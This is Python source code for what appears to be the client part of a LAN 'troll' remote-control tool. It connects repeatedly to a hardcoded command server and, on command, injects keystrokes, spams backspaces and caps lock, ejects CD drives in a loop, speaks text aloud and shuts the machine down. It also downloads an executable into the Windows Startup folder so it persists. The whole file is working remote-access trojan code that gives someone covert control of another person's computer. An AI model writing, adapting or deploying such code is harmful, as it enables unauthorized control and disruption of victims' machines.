#!/usr/bin/python
import socket, time, subprocess, sys, os, urllib, pyttsx
#from pathlib import Path
while True:
    s = socket.socket()
    port = 12345
    try:
        s.connect(('192.168.1.135', port))
        command = s.recv(1024)
        print("Command recieved: "+command)
    except socket.error as err:
        print("Sergeant Commander on a break(Commander offline or unavailable)")
        time.sleep(3)
        continue
    command1 = command.split(" ",1)
    path = os.environ["HOMEPATH"]
    print(path)
    if "ghostkeys" in str(command1[0]):
        path = os.environ["HOMEPATH"]
        finalpathk = "C:"+path+"\Desktop\\keyboard.vbs"
        message = command.split(" ",1)
        print message[1]
        if not os.path.isfile(finalpathk) == True:
            print("keyboard.vbs doesnt exist, creating a new one")
            print(finalpathk)
            with open(finalpathk, 'w') as k:
                k.write('''
Set objArgs = WScript.Arguments
Set wshShell = wscript.CreateObject("WScript.Shell")
keyboardtext = objArgs(0)
wscript.sleep 1000
wshshell.sendkeys keyboardtext
                ''')
                k.close
        subprocess.call(["wscript",finalpathk,message[1]])

    elif "message" in str(command1[0]):
        message = command.split(" ",1)
        print message[1]
        path = os.environ["HOMEPATH"]
        finalpathm = "C:"+path+"\Desktop"+"\message.vbs"
        if not os.path.isfile(finalpathm) == True:
            print("message.vbs doesnt exist, creating a new one")
            with open(finalpathm,'w') as f:
                f.write('Set objArgs = WScript.Arguments\n')
                f.write('messageText = objArgs(0)\n')
                f.write('MsgBox messageText')
                f.close
        subprocess.call(["wscript",finalpathm,message[1]])
    
    elif "cancel" in str(command1[0]):
        print("Stopping wscript.exe services")
        subprocess.call(["taskkill", "/f", "/im", "wscript.exe"])
        print("Cancelling shutdown command")
        subprocess.call(["shutdown", "-a"])
        time.sleep(5)

    elif "shutdown" in str(command1[0]):
        print("Shutting down computer")
        subprocess.call(["shutdown", "-s", "-t", "20"])
        time.sleep(10)

    elif "test" in str(command1[0]):
        print("Initiating test module")
        subprocess.call(["calc"])

    elif "disable" in str(command1[0]):
        print("Stopping wscript.exe services")
        subprocess.call(["taskkill", "/f", "/im", "wscript.exe"])
        sys.exit()

    elif "opencd" in str(command1[0]):
        path = os.environ["HOMEPATH"]
        finalpatho = "C:"+path+"\Desktop"+"\opencd.vbs"
        if not os.path.isfile(finalpatho) == True:
            print("opencd.vbs doesnt exist, creating a new one")
            with open(finalpatho, 'w') as c:
                c.write('Set oWMP = CreateObject("WMPlayer.OCX.7")\n')
                c.write('Set colCDROMs = oWMP.cdromCollection\n')
                c.write('do\n')
                c.write('if colCDROMs.Count >= 1 then\n')
                c.write('For i = 0 to colCDROMs.Count - 1\n')
                c.write('colCDROMs.Item(i).Eject\n')
                c.write('Next\n')
                c.write('For i = 0 to colCDROMs.Count - 1\n')
                c.write('colCDROMs.Item(i).Eject\n')
                c.write('Next\n')
                c.write('End If\n')
                c.write('wscript.sleep 5000\n')
                c.write('loop')
                c.close
        os.startfile(finalpatho)

    elif "togglecaps" in str(command1[0]):
        path = os.environ["HOMEPATH"]
        finalpatht = "C:"+path+"\Desktop\\tcaps.vbs"
        if not os.path.isfile(finalpatht) == True:
            print("tcaps.vbs doesnt exist, creating a new one")
            print(finalpatht)
            with open(finalpatht, 'w') as t:
                t.write('Set wshShell =wscript.CreateObject("WScript.Shell")\n')
                t.write('do\n')
                t.write('wscript.sleep 100\n')
                t.write('wshshell.sendkeys "{CAPSLOCK}"\n')
                t.write('loop')
                t.close
        os.startfile(finalpatht)

    elif "backspaces" in str(command1[0]):
        path = os.environ["HOMEPATH"]
        finalpathb = "C:"+path+"\Desktop\\backspaces.vbs"
        if not os.path.isfile(finalpathb) == True:
            print("backspaces.vbs doesnt exist, creating a new one")
            print(finalpathb)
            with open(finalpathb, 'w') as b:
                b.write('''
Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{bs}"
loop
                ''')
                b.close
        os.startfile(finalpathb)

    elif "cleanup" in str(command1[0]):
        print("Deleting .vbs files")
        path = os.environ["HOMEPATH"]
        finalpatht = "C:"+path+"\Desktop\\tcaps.vbs"
        finalpathb = "C:"+path+"\Desktop\\backspaces.vbs"
        finalpatho = "C:"+path+"\Desktop"+"\opencd.vbs"
        finalpathm = "C:"+path+"\Desktop"+"\message.vbs"
        finalpathk = "C:"+path+"\Desktop\\keyboard.vbs"
        try:
            os.remove(finalpathb)
        except:
            pass
        try:
            os.remove(finalpathk)
        except:
            pass
        try:
            os.remove(finalpathm)
        except:
            pass
        try:
            os.remove(finalpatht)
        except:
            pass
        try:
            os.remove(finalpatho)
        except:
            pass
        print("Done")

    elif "install" in str(command1[0]):
        downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
        url = 'https://rawgit.com/kres0345/LANTroll/master/commander/minion.exe'
        print("Installing")
        try:
            urllib.urlretrieve(url, downloadlocation)
        except:
            print("Well, somethings wrong")
        print("Done")

    elif "uninstall" in str(command1[0]):
        downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
        try:
            os.remove(downloadlocation)
            print("Uninstalled successfully")
        except:
            print("File not found")
            pass

    elif "restart101" in str(command1[0]):
        downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
        print("Restarting Minion")
        print downloadlocation
        try:
            os.startfile(downloadlocation)
            sys.exit()
            print "done"
        except:
            pass
            #print("Not restarting becouse minion isnt installed in startup folder")
            #time.sleep(10)
    elif "instantshutdown" in str(command1[0]):
        subprocess.call(["shutdown", "-s", "-t", "0"])
    
    elif "tts" in str(command1[0]):
        print("Text 2 Speech")
        tts = command.split(" ",1)
        print(tts)
        engine = pyttsx.init()
        engine.say(tts[1])
        engine.runAndWait()
        
    time.sleep(10)
    s.close()
